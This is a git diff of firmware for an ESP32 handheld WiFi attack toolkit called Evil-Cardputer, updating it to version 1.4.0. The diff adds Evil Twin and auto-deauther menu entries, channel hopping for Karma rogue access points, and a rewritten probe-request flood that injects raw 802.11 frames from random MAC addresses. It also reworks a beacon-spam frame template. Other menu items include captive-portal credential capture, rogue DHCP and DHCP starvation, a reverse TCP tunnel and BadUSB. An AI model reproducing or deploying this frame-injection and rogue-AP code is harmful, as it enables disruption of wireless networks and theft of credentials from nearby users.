@@ -1,7 +1,7 @@
 /*
    Evil-M5Core2 - WiFi Network Testing and Exploration Tool
 
-   Copyright (c) 2024 7h30th3r0n3
+   Copyright (c) 2025 7h30th3r0n3
 
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
@@ -117,8 +117,6 @@ IPAddress ipSTA;   // Adresse IP du mode STA
 bool useAP = true; // Alterner entre AP et STA
 const byte DNS_PORT = 53;
 
-
-
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
 const char* menuItems[] = {
@@ -146,6 +144,8 @@ const char* menuItems[] = {
     "Wardriving Master",
     "Beacon Spam",
     "Deauther",
+    "Auto Deauther",
+    "Evil Twin",
     "Handshake Master",
     "WiFi Raw Sniffing",
     "Sniff Raw Clients",
@@ -164,6 +164,7 @@ const char* menuItems[] = {
     "Web Crawler",
     "PwnGrid Spam",
     "Skimmer Detector",
+    "Mouse Jiggler",
     "BadUSB",
     "Bluetooth Keyboard",
     "Reverse TCP Tunnel",
@@ -175,8 +176,12 @@ const char* menuItems[] = {
     "File Print",
     "Check printer status",
     "HoneyPot",
-    "Settings",
+    "LLM Chat Stream",
+    "EvilChatMesh",
+    "SD on USB",
+    "Settings"
 };
+
 
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
@@ -269,6 +274,13 @@ int probeDisplayState = 0;
 static bool isInitialDisplayDone = false;
 char lastDeployedSSID[33] = {0};
 bool karmaSuccess = false;
+
+const int karmaChannels[] = {1, 6, 11};
+const int numKarmaChannels = sizeof(karmaChannels) / sizeof(karmaChannels[0]);
+int currentKarmaChannelIndex = 0;
+unsigned long lastKarmaChannelSwitch = 0;
+const unsigned long karmaChannelInterval = 333; // en ms
+
 //AutoKarma end
 
 //config file
@@ -410,6 +422,9 @@ M5Canvas taskBarCanvas(&M5.Display); // Framebuffer pour la barre de tâches
 //badusb
 
 #include <USBHIDKeyboard.h>
+
+#include <USBHIDMouse.h>
+
 #include <USB.h>
 #include <functional>
 #define DEF_DELAY 50
@@ -513,6 +528,19 @@ BLEHIDDevice* hid;
 BLECharacteristic* keyboardInput;
 bool isConnected = false;
 bool isBluetoothKeyboardActive = false; // Indicateur pour l'état du clavier Bluetooth
+
+
+String discordWebhookURL = "";
+
+String llmHost        = "";
+int    llmhttpsPort   = 443;
+String llmapiPath     = "/evilOllama/api/generate";
+String llmUser        = "";
+String llmPass        = "";
+String llmModel       = "tinyllama";
+int    llmMaxTokens   = 512;
+
+char currentNick[16] = "";
 
 void setup() {
   M5.begin();
@@ -870,19 +898,12 @@ void setup() {
       restoreConfigParameter("ledOn");
       restoreConfigParameter("soundOn");
       restoreConfigParameter("volume");
-      restoreConfigParameter("randomOn"); 
+      restoreConfigParameter("randomOn");
       restoreConfigParameter("selectedTheme");
       restoreConfigParameter("wifi_ssid");
       restoreConfigParameter("wifi_password");
-      restoreConfigParameter("ssh_user");
-      restoreConfigParameter("ssh_host");
-      restoreConfigParameter("ssh_password");
-      restoreConfigParameter("ssh_port");
-      restoreConfigParameter("tcp_host");
-      restoreConfigParameter("tcp_port");
       restoreConfigParameter("baudrate_gps");
-      restoreConfigParameter("webpassword");
-      
+
       restoreThemeParameters();
       delay(500);
       loadStartupImageConfig();
@@ -931,7 +952,23 @@ void setup() {
           }
       }
   }
-
+  //mooved to reduce time at boot before printing image
+  restoreConfigParameter("ssh_user");
+  restoreConfigParameter("ssh_host");
+  restoreConfigParameter("ssh_password");
+  restoreConfigParameter("ssh_port");
+  restoreConfigParameter("tcp_host");
+  restoreConfigParameter("tcp_port");
+  restoreConfigParameter("webpassword");
+  restoreConfigParameter("discordWebhookURL");
+  restoreConfigParameter("llm_host");
+  restoreConfigParameter("llm_port");
+  restoreConfigParameter("llm_api_path");
+  restoreConfigParameter("llm_user");
+  restoreConfigParameter("llm_pass");
+  restoreConfigParameter("llm_model");
+  restoreConfigParameter("llm_max_tokens");
+  restoreConfigParameter("evilChatNickname");
 
   int textY = 30;
   int lineOffset = 10;
@@ -948,7 +985,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.3.9 2024";
+  const char* text3 = "v1.4.0 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -978,7 +1015,7 @@ void setup() {
   Serial.println("-------------------");
   Serial.println("Evil-Cardputer");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("v1.3.9 2024");
+  Serial.println("v1.4.0 2025");
   Serial.println("-------------------");
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1069,7 +1106,7 @@ void setup() {
   cardgps.begin(baudrate_gps, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
   pinMode(signalPin, OUTPUT);
   digitalWrite(signalPin, LOW);
-  
+
   auto cfg = M5.config();
   M5Cardputer.begin(cfg, true);
   drawMenu();
@@ -1245,11 +1282,15 @@ void drawTaskBar() {
   taskBarCanvas.pushSprite(0, 0);
 }
 
+void hopKarmaChannel() {
+  currentKarmaChannelIndex = (currentKarmaChannelIndex + 1) % numKarmaChannels;
+  int channel = karmaChannels[currentKarmaChannelIndex];
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
 
 
 
 void loop() {
-  M5.update();
   M5Cardputer.update();
   handleDnsRequestSerial();
   unsigned long currentMillis = millis();
@@ -1276,6 +1317,10 @@ void loop() {
         break;
 
       case ScanningKarma:
+        if (millis() - lastKarmaChannelSwitch > karmaChannelInterval) {
+            lastKarmaChannelSwitch = millis();
+            hopKarmaChannel();
+        }
         if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
           isKarmaMode = true;
           stopScanKarma();
@@ -1328,168 +1373,66 @@ void executeMenuItem(int index) {
   inMenu = false;
   isOperationInProgress = true;
   switch (index) {
-     case 0:
-        scanWifiNetworks();
-        break;
-    case 1:
-        showWifiList();
-        break;
-    case 2:
-        showWifiDetails(currentListIndex);
-        break;
-    case 3:
-        setWifiSSID();
-        break;
-    case 4:
-        setWifiPassword();
-        break;
-    case 5:
-        setMacAddress();
-        break;
-    case 6:
-        createCaptivePortal();
-        break;
-    case 7:
-        stopCaptivePortal();
-        break;
-    case 8:
-        changePortal();
-        break;
-    case 9:
-        checkCredentials();
-        break;
-    case 10:
-        deleteCredentials();
-        break;
-    case 11:
-        displayMonitorPage1();
-        break;
-    case 12:
-        probeAttack();
-        break;
-    case 13:
-        probeSniffing();
-        break;
-    case 14:
-        karmaAttack();
-        break;
-    case 15:
-        startAutoKarma();
-        break;
-    case 16:
-        karmaSpear();
-        break;
-    case 17:
-        listProbes();
-        break;
-    case 18:
-        deleteProbe();
-        break;
-    case 19:
-        deleteAllProbes();
-        break;
-    case 20:
-        wardrivingMode();
-        break;
-    case 21:
-        startWardivingMaster();
-        break;
-    case 22:
-        beaconAttack();
-        break;
-    case 23:
-        deauthAttack(currentListIndex);
-        break;
-    case 24:
-        sniffMaster();
-        break;
-    case 25:
-        allTrafficSniffer();
-        break;
-    case 26:
-        sniffNetwork();
-        break;
-    case 27:
-        wifiVisualizer();
-        break;
-    case 28:
-        deauthClients();
-        break;
-    case 29:
-        deauthDetect();
-        break;
-    case 30:
-        checkHandshakes();
-        break;
-    case 31:
-        wallOfFlipper();
-        break;
-    case 32:
-        sendTeslaCode();
-        break;
-    case 33:
-        connectWifi(currentListIndex);
-        break;
-    case 34:
-        sshConnect();
-        break;
-    case 35:
-        scanIpPort();
-        break;
-    case 36:
-        scanHosts();
-        break;
-    case 37:
-        FullNetworkAnalysis(false);
-        break;
-    case 38:
-        ListNetworkAnalysis();
-        break;
-    case 39:
-        webCrawling();
-        break;
-    case 40:
-        send_pwnagotchi_beacon_main();
-        break;
-    case 41:
-        skimmerDetection();
-        break;
-    case 42:
-        badUSB();
-        break;
-    case 43:
-        initBluetoothKeyboard();
-        break;
-    case 44:
-        reverseTCPTunnel();
-        break;
-    case 45:
-        startDHCPStarvation();
-        break;
-    case 46:
-        rogueDHCP();
-        break;
-    case 47:
-        switchDNS();
-        break;
-    case 48:
-        DHCPAttackAuto();
-        break;
-    case 49:
-        detectPrinter();
-        break;
-    case 50:
-        printFile();
-        break;
-    case 51:
-        checkPrinterStatus();
-        break;
-    case 52:
-        startHoneypot();
-        break;
-    case 53:
-        showSettingsMenu();
-        break;
+    case 0:  scanWifiNetworks();break;
+    case 1:  showWifiList(); break;
+    case 2:  showWifiDetails(currentListIndex); break;
+    case 3:  setWifiSSID(); break;
+    case 4:  setWifiPassword(); break;
+    case 5:  setMacAddress(); break;
+    case 6:  createCaptivePortal(); break;
+    case 7:  stopCaptivePortal(); break;
+    case 8:  changePortal(); break;
+    case 9:  checkCredentials(); break;
+    case 10: deleteCredentials(); break;
+    case 11: displayMonitorPage1(); break;
+    case 12: probeAttack(); break;
+    case 13: probeSniffing(); break;
+    case 14: karmaAttack(); break;
+    case 15: startAutoKarma(); break;
+    case 16: karmaSpear(); break;
+    case 17: listProbes(); break;
+    case 18: deleteProbe(); break;
+    case 19: deleteAllProbes(); break;
+    case 20: wardrivingMode(); break;
+    case 21: startWardivingMaster(); break;
+    case 22: beaconAttack(); break;
+    case 23: deauthAttack(currentListIndex); break;
+    case 24: autoDeauther(); break;    
+    case 25: startEvilTwin(currentListIndex); break;
+    case 26: sniffMaster(); break;
+    case 27: allTrafficSniffer(); break;
+    case 28: sniffNetwork(); break;
+    case 29: wifiVisualizer(); break;
+    case 30: deauthClients(); break;
+    case 31: deauthDetect(); break;
+    case 32: checkHandshakes(); break;
+    case 33: wallOfFlipper(); break;
+    case 34: sendTeslaCode(); break;
+    case 35: connectWifi(currentListIndex); break;
+    case 36: sshConnect(); break;
+    case 37: scanIpPort(); break;
+    case 38: scanHosts(); break;
+    case 39: FullNetworkAnalysis(false); break;
+    case 40: ListNetworkAnalysis(); break;
+    case 41: webCrawling(); break;
+    case 42: send_pwnagotchi_beacon_main(); break;
+    case 43: skimmerDetection(); break;
+    case 44: runMouseJiggler(); break;          
+    case 45: badUSB(); break;  
+    case 46: initBluetoothKeyboard(); break;
+    case 47: reverseTCPTunnel(); break;
+    case 48: startDHCPStarvation(); break;
+    case 49: rogueDHCP(); break;
+    case 50: switchDNS(); break;
+    case 51: DHCPAttackAuto(); break;
+    case 52: detectPrinter(); break;
+    case 53: printFile(); break;
+    case 54: checkPrinterStatus(); break;
+    case 55: startHoneypot(); break;
+    case 56: evilLLMChatStream(); break;
+    case 57: EvilChatMesh(); break;
+    case 58: sdToUsb(); break;
+    case 59: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2337,12 +2280,13 @@ void handleLogRequest() {
 void createCaptivePortal() {
   String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
      // Vérification de la connexion Wi-Fi et mise à jour des variables
-  if (WiFi.localIP().toString() == "0.0.0.0") {
-        WiFi.mode(WIFI_MODE_AP);
-  } else {
-        WiFi.mode(WIFI_MODE_APSTA);
-  }
+
   if (!isAutoKarmaActive) {
+     if (WiFi.localIP().toString() == "0.0.0.0") {
+          WiFi.mode(WIFI_MODE_AP);
+    } else {
+          WiFi.mode(WIFI_MODE_APSTA);
+    }
     if (captivePortalPassword == "") {
       WiFi.softAP(clonedSSID.c_str());
     } else {
@@ -3862,20 +3806,31 @@ void displayMonitorPage3() {
 }
 
 
-
 void probeSniffing() {
   isProbeSniffingMode = true;
   isProbeSniffingRunning = true;
   startScanKarma();
 
+  uint8_t channels[] = {1, 6, 11};
+  size_t channelIndex = 0;
+  unsigned long lastHop = millis();
+  const unsigned long hopInterval = 333; // 250 ms
+
   while (isProbeSniffingRunning) {
-    M5.update(); M5Cardputer.update();
+    M5Cardputer.update();
     handleDnsRequestSerial();
 
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
       stopProbeSniffingViaSerial = false;
       isProbeSniffingRunning = false;
       break;
+    }
+
+    unsigned long now = millis();
+    if (now - lastHop >= hopInterval) {
+      esp_wifi_set_channel(channels[channelIndex], WIFI_SECOND_CHAN_NONE);
+      channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
+      lastHop = now;
     }
   }
 
@@ -3885,6 +3840,7 @@ void probeSniffing() {
     stopProbeSniffingViaSerial = false;
   }
 }
+
 
 
 
@@ -4676,6 +4632,9 @@ void adjustVolume() {
 }
 
 
+void generateDefaultNick() {
+    snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
+}
 
 void saveConfigParameter(String key, int value) {
   if (!SD.exists(configFolderPath)) {
@@ -4727,6 +4686,8 @@ void restoreConfigParameter(String key) {
         line = configFile.readStringUntil('\n');
         if (line.startsWith(key + "=")) {
           stringValue = line.substring(line.indexOf('=') + 1);
+          stringValue.trim();
+
           if (key == "brightness") {
             intValue = stringValue.toInt();
             M5.Display.setBrightness(intValue);
@@ -4767,7 +4728,7 @@ void restoreConfigParameter(String key) {
             Serial.println("SSH Port restored to " + String(intValue));
           } else if (key == "tcp_host") {
             tcp_host = stringValue;
-            Serial.println("TCP host restored to " + String(intValue));
+            Serial.println("TCP host restored to " + stringValue);
           } else if (key == "tcp_port") {
             intValue = stringValue.toInt();
             tcp_port = intValue;
@@ -4779,33 +4740,84 @@ void restoreConfigParameter(String key) {
           } else if (key == "webpassword") {
             accessWebPassword = stringValue;
             Serial.println("Web password restored");
+          } else if (key == "discordWebhookURL") {
+            discordWebhookURL = stringValue;
+            Serial.println("Discord Webhook URL restored to " + stringValue);
+          } else if (key == "llm_host") {
+            llmHost = stringValue;
+            Serial.println("LLM Host restored to " + stringValue);
+          } else if (key == "llm_port") {
+            intValue = stringValue.toInt();
+            llmhttpsPort = intValue;
+            Serial.println("LLM Port restored to " + String(intValue));
+          } else if (key == "llm_api_path") {
+            llmapiPath = stringValue;
+            Serial.println("LLM API Path restored to " + stringValue);
+          } else if (key == "llm_user") {
+            llmUser = stringValue;
+            Serial.println("LLM Username restored to " + stringValue);
+          } else if (key == "llm_pass") {
+            llmPass = stringValue;
+            Serial.println("LLM Password restored");
+          } else if (key == "llm_model") {
+            llmModel = stringValue;
+            Serial.println("LLM Model restored to " + stringValue);
+          } else if (key == "llm_max_tokens") {
+            intValue = stringValue.toInt();
+            llmMaxTokens = intValue;
+            Serial.println("LLM Max Tokens restored to " + String(intValue));
+          } else if (key == "evilChatNickname") {
+            stringValue.toCharArray(currentNick, sizeof(currentNick));
+            Serial.println("Nickname restored to " + String(currentNick));
           }
+
           keyFound = true;
           break;
         }
       }
       configFile.close();
 
+      // Defaults si clé non trouvée
       if (!keyFound) {
         Serial.println("Key not found in config, using default for " + key);
         if (key == "brightness") {
           M5.Display.setBrightness(defaultBrightness);
         } else if (key == "volume") {
-          M5Cardputer.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
+          M5Cardputer.Speaker.setVolume(180);
         } else if (key == "ledOn") {
-          boolValue = false;  // Default to LED off
+          boolValue = false;
         } else if (key == "soundOn") {
-          boolValue = false;  // Default to sound off
+          boolValue = false;
         } else if (key == "randomOn") {
-          boolValue = false;  // Default to random startup disabled
+          boolValue = false;
         } else if (key == "baudrate_gps") {
-          baudrate_gps = 9600; // Default baudrate for GPS
+          baudrate_gps = 9600;
         } else if (key == "webpassword") {
-          accessWebPassword = "7h30th3r0n3"; // Default web password
+          accessWebPassword = "7h30th3r0n3";
+        } else if (key == "discordWebhookURL") {
+          discordWebhookURL = "";
+        } else if (key == "llm_host") {
+          llmHost = "7h30th3r0n3.com";
+        } else if (key == "llm_port") {
+          llmhttpsPort = 443;
+        } else if (key == "llm_api_path") {
+          llmapiPath = "/evilOllama/api/generate";
+        } else if (key == "llm_user") {
+          llmUser = "";
+        } else if (key == "llm_pass") {
+          llmPass = "";
+        } else if (key == "llm_model") {
+          llmModel = "tinyllama";
+        } else if (key == "llm_max_tokens") {
+          llmMaxTokens = 256;
+        } else if (key == "evilChatNickname") {
+          snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
+          currentNick[sizeof(currentNick) - 1] = '\0';
+          Serial.println("Default Nickname generated: " + String(currentNick));
         }
       }
 
-      // Appliquer les paramètres après récupération
+      // Application booléens
       if (key == "ledOn") {
         ledOn = boolValue;
       } else if (key == "soundOn") {
@@ -4813,30 +4825,50 @@ void restoreConfigParameter(String key) {
       } else if (key == "randomOn") {
         randomOn = boolValue;
       }
-
     } else {
-      Serial.println("Error when opening config.txt");
+      Serial.println("Error opening config.txt");
     }
   } else {
     Serial.println("Config file not found, using default values");
+
+    // Répliques défaut en l'absence de fichier
     if (key == "brightness") {
       M5.Display.setBrightness(defaultBrightness);
     } else if (key == "volume") {
-      M5Cardputer.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
+      M5Cardputer.Speaker.setVolume(180);
     } else if (key == "ledOn") {
-      ledOn = false;  // Default to LED off
+      ledOn = false;
     } else if (key == "soundOn") {
-      soundOn = false;  // Default to sound off
+      soundOn = false;
     } else if (key == "randomOn") {
-      randomOn = false;  // Default to random startup disabled
+      randomOn = false;
     } else if (key == "baudrate_gps") {
-      baudrate_gps = 9600; // Default baudrate for GPS
+      baudrate_gps = 9600;
     } else if (key == "webpassword") {
-      accessWebPassword = "7h30th3r0n3"; // Default web password
+      accessWebPassword = "7h30th3r0n3";
+    } else if (key == "discordWebhookURL") {
+      discordWebhookURL = "";
+    } else if (key == "llm_host") {
+      llmHost = "";
+    } else if (key == "llm_port") {
+      llmhttpsPort = 443;
+    } else if (key == "llm_api_path") {
+      llmapiPath = "/evilOllama/api/generate";
+    } else if (key == "llm_user") {
+      llmUser = "";
+    } else if (key == "llm_pass") {
+      llmPass = "";
+    } else if (key == "llm_model") {
+      llmModel = "tinyllama";
+    } else if (key == "llm_max_tokens") {
+      llmMaxTokens = 256;
+    } else if (key == "evilChatNickname") {
+      snprintf(currentNick, sizeof(currentNick), "noname%04d", random(0, 10000));
+      currentNick[sizeof(currentNick) - 1] = '\0';
+      Serial.println("Default Nickname generated: " + String(currentNick));
     }
   }
 }
-
 
 
 
@@ -5744,6 +5776,38 @@ std::vector<String> readCustomProbes(const char* filename) {
   return customProbes;
 }
 
+//here
+void sendProbeRequest(const char* ssid) {
+  uint8_t mac[6];
+  for (int i = 0; i < 6; ++i) {
+    mac[i] = random(0x00, 0xFF);
+  }
+
+  uint8_t packet[128] = {
+    0x40, 0x00,             // Type/Subtype: Probe Request
+    0x00, 0x00,             // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source MAC
+    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
+    0x00, 0x00              // Seq ctrl
+  };
+
+  int pos = 24;
+
+  // SSID tag
+  packet[pos++] = 0x00; // SSID Tag Number
+  int ssidLen = strlen(ssid);
+  packet[pos++] = ssidLen;
+  memcpy(&packet[pos], ssid, ssidLen);
+  pos += ssidLen;
+
+  // Supported Rates tag
+  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
+  memcpy(&packet[pos], rates, sizeof(rates));
+  pos += sizeof(rates);
+
+  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
+}
 
 
 int checkNb = 0;
@@ -5768,8 +5832,11 @@ void probeAttack() {
     isItSerialCommand = false;
     customProbes.clear();
   }
+  int ssidIndex = 0;
+  int macChangeRate = 1; // Change MAC tous les 10 probes
+  int channelHopRate = 1; // Change canal tous les 30 probes
   int probeCount = 0;
-  int delayTime = 500; // initial probes delay
+  int delayTime = 25;
   unsigned long previousMillis = 0;
   const int debounceDelay = 200;
   unsigned long lastDebounceTime = 0;
@@ -5781,78 +5848,77 @@ void probeAttack() {
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
 
   int probesTextX = 0;
-  String probesText = "Probe Attack running...";
   M5.Display.setCursor(probesTextX, 37);
-  M5.Display.println(probesText);
-  probesText = "Probes sent: ";
+  M5.Display.println("Probes attack running...");
   M5.Display.setCursor(probesTextX, 52);
-  M5.Display.print(probesText);
+  M5.Display.print("Probes sent: ");
+
   Serial.println("-------------------");
-  Serial.println("Starting Probe Attack");
+  Serial.println("Starting Probes attack");
   Serial.println("-------------------");
 
   while (isProbeAttackRunning) {
-    unsigned long currentMillis = millis();
-    handleDnsRequestSerial();
-    if (currentMillis - previousMillis >= delayTime) {
-      previousMillis = currentMillis;
-      setRandomMAC_STA();
-      setNextWiFiChannel();
-      String ssid;
-      if (!customProbes.empty()) {
-        ssid = customProbes[probeCount % customProbes.size()];
-      } else {
-        ssid = generateRandomSSID(32);
-      }
+        unsigned long currentMillis = millis();
+
+       if (probeCount % macChangeRate == 0) {
+          setRandomMAC_STA();
+        }
+      
+        if (probeCount % channelHopRate == 0) {
+          setNextWiFiChannel();
+        }
+      
+        String ssid;
+        if (!customProbes.empty()) {
+          ssid = customProbes[ssidIndex++ % customProbes.size()];
+        } else {
+          ssid = generateRandomSSID(10 + random(21));
+        }
+      
+        sendProbeRequest(ssid.c_str());
+        probeCount++;
+
       if (ledOn) {
         pixels.setPixelColor(0, pixels.Color(255, 0, 0));
         pixels.show();
-        delay(50);
-
+        delay(30);
         pixels.setPixelColor(0, pixels.Color(0, 0, 0));
         pixels.show();
       }
-      WiFi.begin(ssid.c_str(), "");
 
-      M5.Display.setCursor(probesTextX + 12, 67); // Ajuster la position verticale
-      M5.Display.fillRect(probesTextX +  12, 67, 40, 15, menuBackgroundColor); // Ajuster la taille de la zone à remplir
-      M5.Display.print(++probeCount);
+      M5.Display.setCursor(probesTextX + 12, 67);
+      M5.Display.fillRect(probesTextX + 12, 67, 40, 15, menuBackgroundColor);
+      M5.Display.print(probeCount);
 
-      M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, menuBackgroundColor);
+      Serial.println("Sent probe request: " + ssid);
+    
 
-      M5.Display.setCursor(100, M5.Display.height() / 2);
-      // M5.Display.print("Delay: " + String(delayTime) + "ms");
-
-      Serial.println("Probe sent: " + ssid);
-    }
-
-    M5.update();
     M5Cardputer.update();
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
       isProbeAttackRunning = false;
     }
-
   }
   Serial.println("-------------------");
   Serial.println("Stopping Probe Attack");
   Serial.println("-------------------");
-  restoreOriginalWiFiSettings();
+  //restoreOriginalWiFiSettings(); //here 
   useCustomProbes = false;
   inMenu = true;
   drawMenu();
 }
 
-
 int currentChannel = 1;
 int originalChannel = 1;
 
 void setNextWiFiChannel() {
-  currentChannel++;
-  if (currentChannel > 14) {
-    currentChannel = 1;
-  }
+  static const uint8_t channels[] = {1, 3, 6, 9, 11};
+  static size_t channelIndex = 0;
+
+  channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
+  currentChannel = channels[channelIndex];
   esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
 }
+
 
 void restoreOriginalWiFiSettings() {
   esp_wifi_set_promiscuous(false);
@@ -6031,6 +6097,10 @@ String getMACAddress() {
 void loopAutoKarma() {
   while (isAutoKarmaActive) {
     M5.update(); M5Cardputer.update();
+    if (millis() - lastKarmaChannelSwitch > karmaChannelInterval) {
+      lastKarmaChannelSwitch = millis();
+      hopKarmaChannel();
+    }
 
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
       isAutoKarmaActive = false;
@@ -6231,9 +6301,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.3.9"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.0"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.3.9"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.0"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -6548,8 +6618,10 @@ void karmaSpear() {
 }
 
 
-
 // beacon attack
+
+static uint16_t sequenceNumber = 0; 
+
 std::vector<String> readCustomBeacons(const char* filename) {
     std::vector<String> customBeacons;
     File file = SD.open(filename, FILE_READ);
@@ -6595,42 +6667,35 @@ char *randomSSID() {
 }
 
 char emptySSID[32];
-uint8_t beaconPacket[109] = {
-    0x80, 0x00, 0x00, 0x00,             // Type/Subtype: management beacon frame
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC address (modifié plus tard)
-    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (modifié plus tard)
-    0x00, 0x00,                                     // Fragment & sequence number (will be done by the SDK)
-    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
-    0xe8, 0x03,                                     // Interval: every 1s
-    0x31, 0x00,                                     // Capabilities Information
-    0x00, 0x20, // Tag: Set SSID length, Tag length: 32
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
-    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID
-    0x01, 0x08, // Tag: Supported Rates, Tag length: 8
-    0x82,       // 1(B)
-    0x84,       // 2(B)
-    0x8b,       // 5.5(B)
-    0x96,       // 11(B)
-    0x24,       // 18
-    0x30,       // 24
-    0x48,       // 36
-    0x6c,       // 54
-    0x03, 0x01, // Channel set, length
-    0x01,       // Current Channel
-    0x30, 0x18,
-    0x01, 0x00,
-    0x00, 0x0f, 0xac, 0x04, // WPA2 with CCMP
-    0x02, 0x00,
-    0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
-    0x01, 0x00,
-    0x00, 0x0f, 0xac, 0x02,
-    0x00, 0x00
+uint8_t beaconPacket[86] = {
+    0x80, 0x00, // [0-1] Frame Control: Beacon frame
+    0x00, 0x00, // [2-3] Duration: 0
+
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // [4-9] Destination: broadcast
+    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // [10-15] Source MAC (remplacé dynamiquement)
+    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, // [16-21] BSSID (remplacé dynamiquement)
+    0x00, 0x00,                         // [22-23] Sequence Control (modifié dynamiquement)
+
+    0x00, 0x00, 0x00, 0x00,             // [24-27] Timestamp (modifié dynamiquement)
+    0x00, 0x00, 0x00, 0x00,             // [28-31] Timestamp (suite)
+
+    0x64, 0x00,                         // [32-33] Beacon interval: 100 TU (102.4ms)
+    0x21, 0x04,                         // [34-35] Capabilities: ESS, Short Preamble, Short Slot
+
+    0x00, 0x20,                         // [36-37] SSID Tag: Type = 0, Length = 32 (modifié dynamiquement)
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [38-45] SSID (espaces par défaut)
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [46-53]
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [54-61]
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // [62-69]
+
+    0x01, 0x08,                         // [70-71] Supported Rates Tag: Type = 1, Length = 8
+    0x82, 0x84, 0x8b, 0x96,             // [72-75] Rates: 1, 2, 5.5, 11 Mbps (basic rates)
+    0x24, 0x30, 0x48, 0x6c,             // [76-79] Rates: 18, 24, 36, 54 Mbps
+
+    0x03, 0x01, 0x01                    // [80-82] DS Parameter Set: Type = 3, Length = 1, Channel = 1 (modifié dynamiquement)
 };
 
-const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13}; // Canaux Wi-Fi utilisés (1-11)
+const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
 uint8_t channelIndex = 0;
 uint8_t wifi_channel = 1;
 
@@ -6643,16 +6708,14 @@ void nextChannel() {
 }
 
 void generateRandomWiFiMac(uint8_t *mac) {
-    mac[0] = 0x02; // Unicast, locally administered MAC address
-    for (int i = 1; i < 6; i++) {  // Génère aléatoirement les 5 autres octets
+    mac[0] = 0x02;
+    for (int i = 1; i < 6; i++) {
         mac[i] = random(0, 255);
     }
 }
 
-void beaconSpamList(const char *list, size_t listSize) {
+void beaconSpamList(const char *list, size_t listSize, const uint8_t* macAddr) {
     int i = 0;
-    uint8_t macAddr[6];
-
     Serial.println("Starting beaconSpamList...");
 
     if (listSize == 0) {
@@ -6664,43 +6727,39 @@ void beaconSpamList(const char *list, size_t listSize) {
 
     while (i < listSize) {
         int j = 0;
-        while (list[i + j] != '\n' && j < 32 && i + j < listSize) {
-            j++;
-        }
-
+        while (list[i + j] != '\n' && j < 32 && i + j < listSize) j++;
         uint8_t ssidLen = j;
+        if (ssidLen > 32) { i += j; continue; }
 
-        if (ssidLen > 32) {
-            Serial.println("SSID length exceeds limit. Skipping.");
-            i += j;
-            continue;
-        }
-
-        Serial.print("SSID: ");
-        Serial.write(&list[i], ssidLen);
